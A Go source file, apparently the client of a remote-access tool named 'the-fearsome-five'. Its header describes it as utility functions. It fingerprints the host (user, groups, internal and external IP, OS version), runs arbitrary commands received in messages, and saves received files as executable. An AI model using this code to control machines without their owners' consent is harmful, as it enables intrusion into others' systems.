package main

/*
A namespace for cross-platform utility functions,
like getting a username or file path.
*/

import (
	"encoding/json"
	"errors"
	"io/ioutil"
	"net"
	"net/http"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"unsafe"

	"github.com/lithammer/shortuuid/v3"
	"github.com/mattn/go-shellwords"
	"github.com/mikeflynn/the-fearsome-five/shared"
)

type System struct {
	ClientVersion string `json:"client_version"`
	UUID          string `json:"uuid"`
	OS            string `json:"os"`
	OSVersion     string `json:"os_version"`
	LanIP         string `json:"ip_internal"`
	ExtIP         string `json:"ip_external"`
	User          string `json:"user"`
	Groups        string `json:"groups"`
	tempDir       string `json:"-"`
}

func InitSystem() *System {
	sys := &System{
		ClientVersion: VERSION,
		UUID:          "",
		OS:            runtime.GOOS,
		Groups:        "",
		tempDir:       ".",
	}

	if err := sys.load(); err != nil {
		sys.GetOSVersion()
		sys.GetUser()
		sys.GetUserGroups()
	}

	return sys
}

func (sys *System) save() error {
	return nil
}

func (sys *System) load() error {
	return errors.New("No saved config found.")
}

func (sys *System) toJSON() []byte {
	ret, _ := json.Marshal(sys)
	return ret
}

func (sys *System) GetUser() (string, error) {
	if sys.User == "" {
		u, err := user.Current()
		if err != nil {
			return "", err
		}

		sys.User = u.Username
	}

	return sys.User, nil
}

func (sys *System) GetUserGroups() (string, error) {
	if len(sys.Groups) < 1 {
		u, err := user.Current()
		if err != nil {
			return "", err
		}

		gids, err := u.GroupIds()
		if err != nil {
			return "", err
		}

		tmp := []string{}
		for _, gid := range gids {
			g, err := user.LookupGroupId(gid)

			if err == nil {
				tmp = append(tmp, g.Name)
			}
		}

		sys.Groups = strings.Join(tmp, ",")
	}

	return sys.Groups, nil
}

func (sys *System) GetInternalIP() (string, error) {
	if sys.LanIP == "" {
		conn, err := net.Dial("udp", "8.8.8.8:80")
		if err != nil {
			return "", err
		}

		defer conn.Close()

		localAddr := conn.LocalAddr().(*net.UDPAddr)

		sys.LanIP = localAddr.IP.String()
	}

	return sys.LanIP, nil
}

func (sys *System) GetExternalIP(reload bool) (string, error) {
	if reload || sys.ExtIP == "" {
		resp, err := http.Get("http://checkip.amazonaws.com/")
		if err != nil {
			return "", err
		}

		defer resp.Body.Close()

		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}

		sys.ExtIP = strings.TrimSpace(string(data))
	}

	return sys.ExtIP, nil
}

func (sys *System) GetOSVersion() (string, error) {
	if sys.OSVersion == "" {
		switch sys.OS {
		case "darwin":
			out, err := exec.Command("defaults", "read", "loginwindow", "SystemVersionStampAsString").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		case "windows":
			out, err := exec.Command("ver").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		case "linux":
			out, err := exec.Command("uname", "-r").Output()
			if err != nil {
				return "", err
			}

			sys.OSVersion = strings.TrimSpace(string(out))
		default:
			return "", errors.New("Unsupported OS.")
		}
	}

	return sys.OSVersion, nil
}

func (sys *System) RunCommand(message *shared.Message) (string, error) {
	var cmd *exec.Cmd

	args, err := shellwords.Parse(string(message.Body))
	if err != nil {
		return "", err
	}

	cmd = exec.Command(args[0], args[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	if unsafe.Sizeof(out) > uintptr(shared.MaxMessageSize) {
		return "", errors.New("Output too large for return message.")
	}

	return string(out), nil
}

func (sys *System) SaveFile(msg *shared.Message) (string, error) {
	filename := shortuuid.New()

	err := ioutil.WriteFile(sys.tempDir+"/"+filename, msg.Body, 0744)
	if err != nil {
		return "", err
	}

	return filename, nil
}

func (sys *System) SendFile() (string, error) {
	return "", errors.New("Not yet implemented.")
}
